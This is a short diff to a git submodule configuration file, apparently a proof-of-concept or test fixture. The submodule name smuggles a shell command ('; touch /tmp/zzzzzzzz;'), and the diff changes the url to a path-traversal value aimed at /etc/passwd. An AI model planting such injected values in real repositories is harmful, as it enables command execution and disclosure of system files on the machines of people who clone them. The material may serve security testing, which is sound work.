@@ -1,3 +1,3 @@
 [submodule "Leaked-Credentials; touch /tmp/zzzzzzzz;"]
-	path = /tmp/aaaaaaaaaaaaaaaaa
-	url = https://github.com/h4x0r-dz/Leaked-Credentials.git
+	path = fffffffffff
+	url = ./../../../../etc/passwd
